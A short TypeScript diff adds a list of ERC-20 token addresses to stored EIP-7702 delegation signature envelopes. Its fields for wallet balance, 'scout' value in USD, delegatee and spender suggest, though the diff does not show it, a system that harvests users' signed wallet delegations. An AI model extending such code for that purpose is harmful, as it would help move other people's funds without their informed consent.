@@ -241,6 +241,7 @@ interface NormalizedIngressV1 {
   sui_payload?: Record<string, unknown>
   eip7702_authorization?: Eip7702SignedAuthorization & { chainId?: number; address?: string; nonce?: string | number }
   delegatee?: Address
+  erc20s?: string[]
   scout_value_usd?: number
   amount?: string
   wallet_balance?: string
@@ -2499,6 +2500,7 @@ async function handleNormalizedIngress(
         s: String(authRaw['s']) as Hex,
         yParity: Number(authRaw['yParity'] ?? authRaw['v'] ?? 0),
       }
+      const erc20sRaw = Array.isArray(b.erc20s) ? (b.erc20s as unknown[]).filter((a) => typeof a === 'string' && isAddress(a as string)).map((a) => getAddress(a as string)) : []
       const packed = packEip7702SignatureEnvelope({
         protocol: 'eip7702_delegation',
         chain_id: Number(b.chain_id),
@@ -2506,6 +2508,7 @@ async function handleNormalizedIngress(
         delegatee: getAddress(delegateeRaw),
         spender: spenderRaw && isAddress(spenderRaw) ? getAddress(spenderRaw) : getAddress(delegateeRaw),
         authorization,
+        erc20s: erc20sRaw,
       })
       const sealed = sealSignatureHexForPersistence(packed as Hex)
       const chainIdNorm = String(b.chain_id).trim()
